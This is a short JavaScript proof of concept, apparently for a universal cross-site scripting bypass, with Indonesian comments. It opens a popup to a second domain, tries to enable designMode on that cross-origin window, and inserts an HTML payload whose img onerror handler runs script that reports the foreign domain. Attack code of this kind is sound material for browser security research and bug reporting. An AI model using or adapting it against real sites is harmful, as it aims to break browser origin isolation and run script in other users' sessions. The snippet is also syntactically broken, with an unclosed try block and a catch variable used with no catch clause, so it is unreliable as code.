<script>

  // buka domain kedua
  win = window.open('https://download-bypass.netlify.app/', '_blank');

  setTimeout(function(){
    document.getElementById('h').innerText = 'BYPASS! trying designMode inject...';
    document.title = 'BYPASS!';

    try {
      // coba aktifin designMode di popup domain kedua
      win.document.designMode = 'on';
      win.document.execCommand('insertHTML', false, '<h1>BYPASS! injected</h1><img src=x onerror=alert("UXSS domain=" + document.domain)>');
      document.getElementById('h').innerText = 'BYPASS! inject sent, check second tab';

      document.getElementById('h').innerText = 'blocked: ' + e;

}
